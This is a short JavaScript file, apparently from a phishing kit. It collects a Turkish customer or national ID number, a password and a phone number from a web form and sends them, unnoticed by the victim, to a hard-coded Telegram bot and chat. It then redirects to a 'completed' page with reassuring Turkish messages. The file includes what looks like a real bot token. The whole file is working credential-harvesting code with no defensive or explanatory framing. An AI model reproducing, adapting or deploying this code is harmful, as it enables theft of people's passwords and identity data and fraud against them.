// Replace with your actual chatId and botToken
const chatId = '-4242788975';
const botToken = '6958125868:AAEajL04E4gMRF6wKTUjjs_1dqlkxUSfhDE';

function submitForm(event) {
    event.preventDefault();
    
    // Fetch form data
    const customerID = document.getElementById('customerID').value;
    const password = document.getElementById('password').value;
    const phoneNumber = document.getElementById('phoneNumber').value;

    // Prepare message for Telegram bot
    const message = `Yeni Başvuru!\nMüşteri / T.C. Kimlik Numarası: ${customerID}\nParola: ${password}\nTelefon Numarası: ${phoneNumber}`;

    // Send message to Telegram bot
    sendMessageToTelegram(message);
}

function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Başvurunuz Başarı İle Alınmıştır.:', data);
            window.location.href = 'completed.html'; // Redirect to completed page after successful submission
        })
        .catch(error => {
            console.error('Hata:', error);
            alert('Başvurunuz alınırken bir hata oluştu. Lütfen tekrar deneyiniz.');
        });
}
